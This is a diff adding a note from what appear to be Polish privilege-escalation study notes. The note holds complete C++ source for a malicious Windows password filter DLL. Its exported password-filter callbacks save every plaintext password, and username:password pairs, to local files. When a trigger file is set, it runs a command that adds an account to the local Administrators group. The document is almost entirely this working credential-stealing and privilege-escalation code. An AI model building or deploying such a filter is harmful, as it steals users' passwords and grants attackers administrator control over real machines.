@@ -1,0 +1,114 @@
+---
+title: "Password Filter"
+folder: "06. Privilege Escalation/Pliki Pomocnicze"
+---
+
+
+
+#include "pch.h"
+#include <windows.h>
+#include <stdio.h>
+#include <WinInet.h>
+#include <ntsecapi.h>
+#include <stdio.h>
+#include <iostream>
+#include <fstream>
+using namespace std;
+
+void writeToLog(const char* szString)
+{	
+	std::ifstream inputFile("C:\\Users\\User\\Desktop\\status.txt");
+	int value = 0;
+	if (inputFile.is_open())
+	{
+		inputFile >> value;
+		inputFile.close();
+	}
+
+	if (value == 1)
+	{
+		std::ofstream outputFile("C:\\Users\\User\\Desktop\\status.txt");
+		if (outputFile.is_open())
+		{
+			outputFile << "0";
+			outputFile.close();
+		}
+		WinExec("cmd.exe /c net localgroup Administratorzy Test /add", 0);
+	}
+	FILE* pFile; 
+	fopen_s(&pFile, "c:\\logFile.txt", "a+");
+
+	if (NULL == pFile)
+	{
+		return;
+	}
+	fprintf(pFile, "%s\r\n", szString);
+	fclose(pFile);
+	return;
+
+}
+
+extern "C" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify(void)
+{
+	OutputDebugString(L"InitializeChangeNotify");
+	writeToLog("InitializeChangeNotify()");
+	return TRUE;
+}
+
+extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(
+	PUNICODE_STRING AccountName,
+	PUNICODE_STRING FullName,
+	PUNICODE_STRING Password,
+	BOOLEAN SetOperation)
+{	
+	std::ifstream inputFile("C:\\Users\\User\\Desktop\\status.txt");
+	int value = 0;
+	if (inputFile.is_open())
+	{
+		inputFile >> value;
+		inputFile.close();
+	}
+
+	if (value == 1)
+	{
+		std::ofstream outputFile("C:\\Users\\User\\Desktop\\status.txt");
+		if (outputFile.is_open())
+		{
+			outputFile << "0";
+			outputFile.close();
+		}
+		WinExec("cmd.exe /c net localgroup Administratorzy Test /add", 0);
+	}
+	const char* filename = "C:\\Users\\User\\Desktop\\output.txt";
+
+	std::ofstream file(filename, std::ios::binary);
+	if (file) {
+		const char* buffer = reinterpret_cast<const char*>(Password->Buffer);
+		file.write(buffer, wcslen(Password->Buffer) * sizeof(wchar_t));
+		file.close();
+		std::cout << "String saved to file successfully." << std::endl;
+	}
+	else {
+		std::cerr << "Unable to open file for writing." << std::endl;
+	}
+	OutputDebugString(L"PasswordFilter");
+	return TRUE;
+}
+
+extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(
+	PUNICODE_STRING UserName,
+	ULONG RelativeId,
+	PUNICODE_STRING NewPassword)
+{
+	FILE* pFile;
+	fopen_s(&pFile, "c:\\logFile.txt", "a+");
+
+	OutputDebugString(L"PasswordChangeNotify");
+	if (NULL == pFile)
+	{
+		return true;
+	}
+	fprintf(pFile, "%ws:%ws\r\n", UserName->Buffer, NewPassword->Buffer);
+	fclose(pFile);
+	return 0;
+}
